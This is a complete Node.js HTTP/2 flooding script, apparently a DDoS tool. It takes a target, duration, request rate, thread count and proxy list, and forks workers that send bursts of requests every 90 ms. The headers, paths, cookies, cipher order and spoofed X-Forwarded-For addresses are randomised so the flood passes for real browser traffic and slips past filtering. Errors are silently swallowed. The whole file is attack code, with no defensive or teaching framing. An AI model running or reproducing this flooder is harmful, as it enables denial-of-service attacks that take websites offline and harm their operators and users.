const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});

if (process.argv.length < 7) {
    console.log(`Usage: node flooder.js <target> <time> <rate> <threads> <proxyfile>`);
    process.exit(1);
}

function readLines(filePath) {
    if (!fs.existsSync(filePath)) {
        console.error(`File ${filePath} not found`);
        process.exit(1);
    }
    const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== '');
    if (lines.length === 0) {
        console.error(`Proxy file ${filePath} is empty`);
        process.exit(1);
    }
    return lines;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: Math.floor(parseInt(process.argv[4]) * 1.3),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
if (!parsedTarget.protocol || !parsedTarget.host) {
    console.error('Invalid target URL');
    process.exit(1);
}

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/126.0.2592.68",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:127.0) Gecko/127.0 Firefox/127.0",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Mobile Safari/537.36"
];

const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,*/*;q=0.9"
];
const lang_header = [
    "en-US,en;q=0.9",
    "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8"
];
const encoding_header = [
    "gzip, deflate, br, zstd",
    "gzip, deflate, br",
    "br, gzip",
    "deflate, gzip"
];
const sec_fetch_headers = {
    "sec-fetch-dest": ["document", "empty", "script", "image", "font"],
    "sec-fetch-mode": ["navigate", "cors", "no-cors", "same-origin"],
    "sec-fetch-site": ["same-origin", "same-site", "cross-site", "none"]
};
const cache_control = ["max-age=0", "no-cache", "no-store", "must-revalidate"];
const referers = [
    `https://${parsedTarget.host}/`,
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.youtube.com/",
    ""
];
const platforms = ["Windows", "Macintosh", "iPhone", "Android"];
const sec_ch_ua = [
    '"Google Chrome";v="126", "Chromium";v="126", "Not.A/Brand";v="99"',
    '"Microsoft Edge";v="126", "Chromium";v="126", "Not.A/Brand";v="99"',
    '"Firefox";v="127"',
    '"Safari";v="17"'
];
const sec_ch_ua_full_version = [
    '"126.0.6478.126"',
    '"126.0.2592.68"',
    '"127.0.0"',
    '"17.5.0"'
];
const priorities = ["u=0, i", "u=1", "u=2"];

const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
];

// Random hóa ciphers
function getRandomCiphers() {
    const shuffled = ciphers.sort(() => 0.5 - Math.random());
    return shuffled.slice(0, randomIntn(4, ciphers.length)).join(":");
}

let proxies = readLines(args.proxyFile);

async function validateProxy(proxy) {
    return new Promise((resolve) => {
        const [host, port] = proxy.split(":");
        const socket = net.connect({ host, port, timeout: 3000 });
        socket.on("connect", () => {
            socket.destroy();
            resolve(true);
        });
        socket.on("error", () => {
            socket.destroy();
            resolve(false);
        });
        socket.on("timeout", () => {
            socket.destroy();
            resolve(false);
        });
    });
}

async function filterProxies(proxies) {
    const validProxies = [];
    for (const proxy of proxies) {
        if (await validateProxy(proxy)) {
            validProxies.push(proxy);
        }
    }
    return validProxies;
}

if (cluster.isMaster) {
    console.clear();
    console.log("Validating proxies...");
    filterProxies(proxies).then(validProxies => {
        if (validProxies.length === 0) {
            console.error("No valid proxies found");
            process.exit(1);
        }
        proxies.length = 0;
        proxies.push(...validProxies);
        console.log(`Target: ${parsedTarget.host}`);
        console.log(`Duration: ${args.time}`);
        console.log(`Threads: ${args.threads}`);
        console.log(`RPS: ${args.Rate}`);
        console.log(`Valid proxies: ${proxies.length}`);
        for (let counter = 1; counter <= args.threads; counter++) {
            cluster.fork();
        }
        setTimeout(() => process.exit(0), args.time * 1000);
    });
} else {
    setInterval(runFlooder, 90); // Giảm thời gian chờ để tăng tần suất
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "invalid response");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "timeout");
        });

        connection.on("error", () => {
            connection.destroy();
            return callback(undefined, "error");
        });
    }
}

const Socker = new NetSocket();

function generateDynamicPath() {
    const basePath = parsedTarget.path === "/" ? "" : parsedTarget.path;
    const queries = [
        `q=${randstr(8)}`,
        `id=${randstr(6)}`,
        `page=${randomIntn(1, 100)}`,
        `token=${randstr(10)}`,
        `search=${randstr(5)}`,
        `category=${randstr(7)}`
    ];
    const queryCount = randomIntn(1, 4);
    const selectedQueries = [];
    for (let i = 0; i < queryCount; i++) {
        selectedQueries.push(randomElement(queries));
    }
    return `${basePath}?${selectedQueries.join("&")}`;
}

function generateDynamicHeaders() {
    const cookie = randomIntn(0, 3) > 0 ? `session=${randstr(16)}; user=${randstr(8)}` : "";
    return {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":path": generateDynamicPath(),
        ":scheme": "https",
        "user-agent": randomElement(userAgents),
        "accept": randomElement(accept_header),
        "accept-language": randomElement(lang_header),
        "accept-encoding": randomElement(encoding_header),
        "sec-fetch-dest": randomElement(sec_fetch_headers["sec-fetch-dest"]),
        "sec-fetch-mode": randomElement(sec_fetch_headers["sec-fetch-mode"]),
        "sec-fetch-site": randomElement(sec_fetch_headers["sec-fetch-site"]),
        "sec-ch-ua": randomElement(sec_ch_ua),
        "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
        "sec-ch-ua-platform": randomElement(platforms),
        "sec-ch-ua-full-version": randomElement(sec_ch_ua_full_version),
        "cache-control": randomElement(cache_control),
        "referer": randomElement(referers),
        "upgrade-insecure-requests": "1",
        "priority": randomElement(priorities),
        "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`,
        ...(cookie && { "cookie": cookie })
    };
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    if (!parsedProxy[0] || !parsedProxy[1]) {
        return setTimeout(runFlooder, 800);
    }

    const proxyOptions = {
        host: parsedProxy[0],
        port: parseInt(parsedProxy[1]),
        address: parsedTarget.host + ":443",
        timeout: 3
    };

    let retryCount = 0;
    const maxRetries = 6;

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            if (connection) connection.destroy();
            if (retryCount < maxRetries) {
                retryCount++;
                setTimeout(runFlooder, 800);
            }
            return;
        }

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2', 'http/1.1'],
            ciphers: getRandomCiphers(),
            ecdhCurve: 'auto',
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3'
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 150,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            createConnection: () => tlsConn
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                const dynHeaders = generateDynamicHeaders();
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(dynHeaders);
                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });
                    request.on("error", () => {
                        request.close();
                        request.destroy();
                    });
                    request.end();
                }
            }, 90);
            setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
        });

        client.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(runFlooder, 800);
        });

        client.on("close", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(runFlooder, 800);
        });
    });
}
